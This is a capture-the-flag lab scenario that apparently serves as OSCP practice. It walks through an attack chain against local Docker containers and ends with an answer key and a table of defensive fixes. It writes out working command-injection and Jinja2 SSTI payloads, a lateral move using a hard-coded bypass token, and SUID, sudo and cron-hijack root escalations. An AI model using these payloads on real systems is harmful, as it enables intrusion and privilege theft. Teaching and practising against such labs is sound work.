# Scenario 01 — Full Attack Chain (Multi-Path)

**Difficulty:** Beginner–Intermediate  
**Time estimate:** 60–120 minutes  
**OSCP relevance:** Enumeration, web exploitation, credential discovery, lateral movement, Linux privilege escalation

---

## Objective

Work through a complete end-to-end attack chain against the local lab. Multiple valid paths exist at each stage — choose your own route. All four flags are reachable; the order in which you collect FLAGS 2 and 3 depends on which lateral movement path you take.

| Flag | Location | Skills |
|------|----------|--------|
| `FLAG{enum_the_web}` | Web app `/flag` | Web enumeration |
| `FLAG{lateral_move_success}` | Internal API `/secret` | Lateral movement via RCE |
| `FLAG{db_creds_found}` | PostgreSQL `flags` table | Credential reuse, DB access |
| `FLAG{root_privesc_complete}` | `/root/flag.txt` on privesc host | Linux privilege escalation |

---

## Scope and Safety Boundary

**In scope:** All services listed below. All actions must stay local to your workstation.

**Out of scope:** Your host OS beyond the lab ports listed. Any network interface other than loopback. Any real credentials, real hosts, or internet connectivity.

**Do not** run active scans beyond `127.0.0.1`. Do not push exploits, payloads, or lab changes to public repositories.

---

## Prerequisites

Lab must be running:

```bash
make up
make verify   # all checks green before starting
```

Required tools: `curl`, `nmap` or `nc`, `ssh`

---

## Target Services

| Service | Host:Port | Accessible From |
|---------|-----------|----------------|
| Web app | `127.0.0.1:8080` | Host (direct) |
| Internal API | `forge-internal:9090` | Inside `forge-web` container only |
| Database | `forge-db:5432` | Inside `forge-internal` or `forge-privesc` |
| Privesc host (SSH) | `127.0.0.1:2222` | Host (direct) |

---

## Path Overview

Each stage offers two valid approaches. Mix and match freely.

| Stage | Path A | Path B |
|-------|--------|--------|
| 0 — Enumeration | Port scan + robots.txt | Manual browsing |
| 1 — Foothold | OS command injection (`/ping`) | SSTI (`/greet`) |
| 2 — Credentials | Admin panel (`/admin`) | Backup endpoint (`/backup`) |
| 3 — Lateral Movement | Web RCE → Internal API → FLAG 2 | SSH → privesc host → DB → FLAG 3 |
| 4 — PrivEsc | sudo python3 / SUID find_lab / cron hijack (choose any) |

---

## Stage 0 — Enumeration

### Objective

Identify all reachable services and enumerate interesting endpoints before attempting exploitation.

### Approaches

**Path A — Active scan:**
```bash
nmap -sV -p 8080,2222 127.0.0.1
curl -s http://127.0.0.1:8080/robots.txt
```

**Path B — Manual browsing:**
Browse `http://127.0.0.1:8080` directly. The homepage exposes two interactive forms. Check common web paths: `/robots.txt`, `/admin`, `/backup`, `/flag`.

### Hints

<details>
<summary>Hint 1 (mild)</summary>
Two ports are exposed on `127.0.0.1`. One is a web app; the other is a remote login service.
</details>

<details>
<summary>Hint 2 (direct)</summary>

`/robots.txt` on the web app points to paths the developer wanted crawlers to skip — but that you should request manually.
</details>

### Expected Evidence

- Port `8080`: web application with Ping and Greet forms
- Port `2222`: SSH service
- `/robots.txt` listing `Disallow: /admin` and `Disallow: /backup`

---

## Stage 1 — Initial Foothold

### Objective

Obtain code execution inside the `forge-web` container. Either path yields equivalent access.

### Path A — OS Command Injection (`/ping`)

The `host` field in the Ping form is passed directly to a shell command. Shell metacharacters execute additional commands.

**Test for injection:**
```bash
curl -X POST http://127.0.0.1:8080/ping -d "host=127.0.0.1;id"
```
If the response contains `uid=`, you have command execution inside the container.

<details>
<summary>Hint A1 (mild)</summary>
Shell metacharacters like `;`, `|`, and `$()` chain commands. Append one after a valid hostname.
</details>
<details>
<summary>Hint A2 (direct)</summary>

```bash
curl -X POST http://127.0.0.1:8080/ping -d "host=127.0.0.1;id"
# Expected: uid=0(root) gid=0(root) groups=0(root)
```
</details>

### Path B — Server-Side Template Injection (`/greet`)

The `name` query parameter is inserted directly into a Jinja2 template string and evaluated server-side. Mathematical expressions in `{{ }}` are executed.

**Test for SSTI:**
```bash
curl "http://127.0.0.1:8080/greet?name={{7*7}}"
```
If the page returns `Hello, 49!`, the template engine is evaluating your input.

<details>
<summary>Hint B1 (mild)</summary>
Flask uses the Jinja2 template engine. Jinja2 evaluates `{{ expression }}` on the server. A multiplication expression like `7*7` lets you confirm evaluation vs. reflection.
</details>
<details>
<summary>Hint B2 (stronger)</summary>
Confirmed SSTI — now escalate to RCE. Jinja2 exposes Python internals through the `config` object. Research the `__class__.__init__.__globals__` chain to reach `os.popen`.
</details>
<details>
<summary>Hint B3 (direct)</summary>

```bash
curl -g "http://127.0.0.1:8080/greet?name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
# Expected: uid=0(root) gid=0(root) groups=0(root)
```
</details>

### FLAG 1

```bash
curl -s http://127.0.0.1:8080/flag
# → FLAG{enum_the_web}
```

### Expected Evidence

- `id` or `whoami` output showing process identity inside the container
- `FLAG{enum_the_web}` retrieved from `/flag`

---

## Stage 2 — Credential Discovery

### Objective

Collect credentials that enable lateral movement and privilege escalation in later stages. Write down everything you find.

### Path A — Unauthenticated Admin Panel (`/admin`)

The `/admin` endpoint exposes the internal service registry with no authentication required.

```bash
curl -s http://127.0.0.1:8080/admin
```

**What you get:**
- Internal API host, port, and service token (`internal_lab_secret_do_not_reuse`)
- Database: host `forge-db`, user `app`, password `SuperSecret1!`
- SSH credentials: user `labuser`, password `labpassword` (for `forge-privesc`)

<details>
<summary>Hint A1</summary>
`/robots.txt` listed `/admin`. Request it directly — no credentials are required.
</details>

### Path B — Exposed Backup Configuration (`/backup`)

The `/backup` endpoint returns the database connection URL used by the web application.

```bash
curl -s http://127.0.0.1:8080/backup
# → # backup config
# → DB_URL=postgres://app:SuperSecret1!@db/appdb
```

**What you get:**
- Database credentials: user `app`, password `SuperSecret1!`

<details>
<summary>Hint B1</summary>
`/robots.txt` listed `/backup`. The response is a connection string — parse out the username and password.
</details>

### Which path to choose?

- **Path A** gives SSH creds, DB creds, and the internal API token in one request. Use it if you want the fastest route to all four flags.
- **Path B** gives DB credentials only. Sufficient for Stage 3 Path B, but you will still need `/admin` to get SSH credentials before Stage 4.

### Expected Evidence

From Path A: `labuser:labpassword`, `app:SuperSecret1!`, `internal_lab_secret_do_not_reuse`

From Path B: `app:SuperSecret1!` (from the DB_URL connection string)

---

## Stage 3 — Lateral Movement

### Objective

Move beyond the `forge-web` container to reach internal services. Both paths are valid; they yield different flags.

---

### Path A — Web RCE to Internal API

**Requires:** Foothold in `forge-web` (Stage 1, either path)

The internal API (`forge-internal:9090`) is not directly reachable from your host — only containers on `public_net` can reach it. Use your RCE inside `forge-web` to proxy requests.

**Via command injection:**
```bash
curl -X POST http://127.0.0.1:8080/ping \
  -d 'host=forge-internal:9090/secret -H "X-Internal-Token: lab-bypass" #'
```

**Verification via docker exec:**
```bash
docker exec forge-web curl -s http://forge-internal:9090/secret \
  -H "X-Internal-Token: lab-bypass"
# → {"flag": "FLAG{lateral_move_success}", "secret_key": "internal_lab_secret_do_not_reuse"}
```

<details>
<summary>Hint A1 (mild)</summary>
From inside `forge-web`, `forge-internal` resolves as a hostname. First confirm reachability:

```bash
curl -X POST http://127.0.0.1:8080/ping -d "host=forge-internal:9090/health #"
```
</details>
<details>
<summary>Hint A2 (stronger)</summary>
The `/secret` endpoint checks the `X-Internal-Token` header. The value `lab-bypass` is a hard-coded fallback in the source code. Use curl's `-H` flag in your injected command.
</details>
<details>
<summary>Hint A3 (direct)</summary>

The `#` at the end of the injected host value comments out the rest of the shell command that `ping` appends, so the curl runs cleanly:

```
host = forge-internal:9090/secret -H "X-Internal-Token: lab-bypass" #
```
Shell sees: `ping -c 2 forge-internal:9090/secret -H "X-Internal-Token: lab-bypass" #-c 2 127.0.0.1`
→ `ping` fails immediately, but the `#` causes the rest to be ignored.

Alternatively, use `;curl ...` to make it explicit:
```
host = 127.0.0.1 ; curl -s http://forge-internal:9090/secret -H "X-Internal-Token: lab-bypass"
```
</details>

### FLAG 2

```
FLAG{lateral_move_success}
```

---

### Path B — SSH to Privesc Host, then psql to Database

**Requires:** SSH credentials (`labuser:labpassword` from `/admin`) and DB credentials (`app:SuperSecret1!` from `/admin` or `/backup`)

`forge-privesc` is dual-homed: it is on both `public_net` (enabling the published SSH port) and `internal_net` (giving it a route to `forge-db`). Once you SSH in, you can reach the database directly.

**Step 1 — SSH in:**
```bash
ssh labuser@127.0.0.1 -p 2222
# password: labpassword
```

**Step 2 — Connect to the database from inside forge-privesc:**
```bash
PGPASSWORD=SuperSecret1! psql -h forge-db -U app -d appdb -c "SELECT value FROM flags;"
# → FLAG{db_creds_found}
```

<details>
<summary>Hint B1 (mild)</summary>
`forge-privesc` sits on the internal network alongside `forge-db`. After SSH-ing in, confirm the database port is reachable:

```bash
nc -z forge-db 5432 && echo "open"
```
</details>
<details>
<summary>Hint B2 (direct)</summary>

```bash
PGPASSWORD=SuperSecret1! psql -h forge-db -U app -d appdb -c "SELECT value FROM flags;"
```

The password comes from the `/backup` endpoint or the `/admin` service registry.
</details>

### FLAG 3

```
FLAG{db_creds_found}
```

### Expected Evidence

- PATH A: JSON response from `/secret` containing `FLAG{lateral_move_success}`
- PATH B: psql output from `appdb.flags` table containing `FLAG{db_creds_found}`

---

## Stage 4 — Privilege Escalation

### Objective

Escalate from `labuser` to `root` on `forge-privesc` and read `/root/flag.txt`. Three independent methods exist — choose any one.

### Setup

If not already logged in (Stage 3 Path B puts you here):
```bash
ssh labuser@127.0.0.1 -p 2222   # password: labpassword
```

**Always enumerate first:**
```bash
sudo -l                           # what can labuser run as root?
find / -perm -4000 2>/dev/null    # SUID binaries
ls -la /etc/cron.d/ /opt/         # cron jobs and writable scripts
```

---

### Method 1 — sudo python3

**Hint:** `sudo -l` shows `labuser` can run `/usr/bin/python3` as root with no password. Python can replace the current process with a shell.

```bash
sudo python3 -c 'import os; os.execl("/bin/bash", "bash")'
# Prompt changes to root (#)
cat /root/flag.txt
```

**Expected result:** Shell with `uid=0(root)`, flag readable at `/root/flag.txt`.

---

### Method 2 — SUID find_lab Binary

**Hint:** `/usr/local/bin/find_lab` is a copy of `find` with the SUID bit set. GTFOBins documents how `find -exec` can spawn a privileged shell.

```bash
/usr/local/bin/find_lab /root -exec /bin/bash -p \; -quit
# euid=0(root) in id output
cat /root/flag.txt
```

**Expected result:** Effective UID `euid=0`, flag readable.

---

### Method 3 — World-Writable Cron Job Hijack

**Hint:** `/opt/cleanup.sh` runs every minute as root and has permissions `777`. Overwrite it to copy bash with a SUID bit, then execute the copy.

```bash
echo '#!/bin/bash' > /opt/cleanup.sh
echo 'cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash' >> /opt/cleanup.sh
# Wait up to 60 seconds for cron to fire, then:
/tmp/rootbash -p
/tmp/rootbash -p -c "cat /root/flag.txt"
```

**Expected result:** `/tmp/rootbash` exists with SUID set, `id` shows `euid=0`, flag readable.

---

### FLAG 4

```
FLAG{root_privesc_complete}
```

---

## Flags & Validation

All four flags, collectable in any order:

```
FLAG{enum_the_web}           — Stage 1 (/flag endpoint on web app)
FLAG{lateral_move_success}   — Stage 3 Path A (internal API /secret)
FLAG{db_creds_found}         — Stage 3 Path B (PostgreSQL flags table)
FLAG{root_privesc_complete}  — Stage 4 (/root/flag.txt on forge-privesc)
```

Run `make verify` to confirm the lab is in a clean state before and after each attempt.

---

## Walkthrough (Open Only If Stuck)

<details>
<summary>Full answer key — expand only after attempting with the hints above</summary>

### Route 1 — Command Injection + Admin Panel → Internal API + DB → sudo privesc

```bash
# Stage 0: Enumeration
nmap -sV -p 8080,2222 127.0.0.1
curl -s http://127.0.0.1:8080/robots.txt

# Stage 1: Foothold via command injection
curl -X POST http://127.0.0.1:8080/ping -d "host=127.0.0.1;id"
# → uid=0(root)

# Stage 1: FLAG 1
curl -s http://127.0.0.1:8080/flag
# → FLAG{enum_the_web}

# Stage 2: All credentials from admin panel
curl -s http://127.0.0.1:8080/admin
# → labuser:labpassword (SSH), app:SuperSecret1! (DB), internal_lab_secret_do_not_reuse (API token)

# Stage 3 Path A: Lateral to internal API via command injection
curl -X POST http://127.0.0.1:8080/ping \
  -d 'host=127.0.0.1 ; curl -s http://forge-internal:9090/secret -H "X-Internal-Token: lab-bypass"'
# → {"flag": "FLAG{lateral_move_success}", ...}

# Stage 3 Path B: SSH → forge-privesc → psql → forge-db
ssh labuser@127.0.0.1 -p 2222   # password: labpassword
PGPASSWORD=SuperSecret1! psql -h forge-db -U app -d appdb -c "SELECT value FROM flags;"
# → FLAG{db_creds_found}

# Stage 4: Privesc via sudo python3
sudo python3 -c 'import os; os.execl("/bin/bash", "bash")'
cat /root/flag.txt
# → FLAG{root_privesc_complete}
```

### Route 2 — SSTI + Backup Endpoint → Internal API → SUID privesc

```bash
# Stage 1: Confirm SSTI
curl "http://127.0.0.1:8080/greet?name={{7*7}}"
# → Hello, 49!

# Stage 1: RCE via SSTI
curl -g "http://127.0.0.1:8080/greet?name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
# → uid=0(root)

# Stage 1: FLAG 1
curl -s http://127.0.0.1:8080/flag
# → FLAG{enum_the_web}

# Stage 2: DB creds from backup endpoint
curl -s http://127.0.0.1:8080/backup
# → DB_URL=postgres://app:SuperSecret1!@db/appdb

# Stage 2: SSH creds (still needed for Stage 4)
curl -s http://127.0.0.1:8080/admin
# → labuser:labpassword

# Stage 3 Path A: Lateral via SSTI RCE
curl -g "http://127.0.0.1:8080/greet?name={{config.__class__.__init__.__globals__['os'].popen('curl%20-s%20http://forge-internal:9090/secret%20-H%20X-Internal-Token:%20lab-bypass').read()}}"
# → {"flag": "FLAG{lateral_move_success}", ...}

# Stage 4: Privesc via SUID binary
ssh labuser@127.0.0.1 -p 2222   # password: labpassword
/usr/local/bin/find_lab /root -exec /bin/bash -p \; -quit
cat /root/flag.txt
# → FLAG{root_privesc_complete}
```

### Route 3 — Command Injection + Backup Endpoint → DB via SSH → Cron privesc

```bash
# Stage 1: Foothold via command injection
curl -X POST http://127.0.0.1:8080/ping -d "host=127.0.0.1;id"

# Stage 1: FLAG 1
curl -s http://127.0.0.1:8080/flag

# Stage 2 Path B: DB creds only from /backup
curl -s http://127.0.0.1:8080/backup
# Stage 2 Path A: SSH creds from /admin (needed for Stage 3B + Stage 4)
curl -s http://127.0.0.1:8080/admin

# Stage 3 Path B: SSH → psql → DB flag
ssh labuser@127.0.0.1 -p 2222   # password: labpassword
PGPASSWORD=SuperSecret1! psql -h forge-db -U app -d appdb -c "SELECT value FROM flags;"
# → FLAG{db_creds_found}

# Stage 4: Privesc via cron hijack
echo '#!/bin/bash' > /opt/cleanup.sh
echo 'cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash' >> /opt/cleanup.sh
# wait up to 60s for cron
/tmp/rootbash -p -c "cat /root/flag.txt"
# → FLAG{root_privesc_complete}
```

</details>

---

## Defensive Lessons

| Vulnerability | Root Cause | Correct Fix |
|---------------|-----------|-------------|
| OS command injection (`/ping`) | `shell=True` with unsanitized input | Use `subprocess.run([...], shell=False)` with an argument list |
| SSTI (`/greet`) | User input passed directly to `render_template_string` | Treat user input as data; use `render_template` with static templates |
| Unauthenticated admin panel (`/admin`) | No access control | Require authentication; never expose service registries via HTTP |
| Credential leak in backup endpoint (`/backup`) | Sensitive data in unauthenticated HTTP response | Serve config from environment/secrets manager; require authentication |
| Hard-coded bypass token (`/secret`) | `token == "lab-bypass"` fallback in source | Use environment-injected secrets with no hard-coded fallback |
| Plaintext DB passwords | Missing password hashing | Use `bcrypt`/`scrypt`; never store or transmit plaintext passwords |
| `sudo NOPASSWD: /usr/bin/python3` | Overly permissive sudoers | Restrict `sudo` to specific, purpose-built scripts; never allow interactive interpreters |
| SUID on `find_lab` | Unnecessary SUID on a general-purpose binary | Audit SUID binaries; remove SUID from anything that can execute arbitrary code |
| World-writable cron script | Incorrect file permissions | Cron scripts must be owned by root, mode `700` or `755` |
| Credential reuse across services | Poor password hygiene | Use unique credentials per service; rotate on schedule |

---

## Reset Steps

After completing the scenario, restore the lab to a clean state:

```bash
make reset     # destroys volumes and rebuilds all containers
make verify    # confirm clean state before next run
```

For a full teardown including the optional kind cluster:

```bash
make reset-all
```
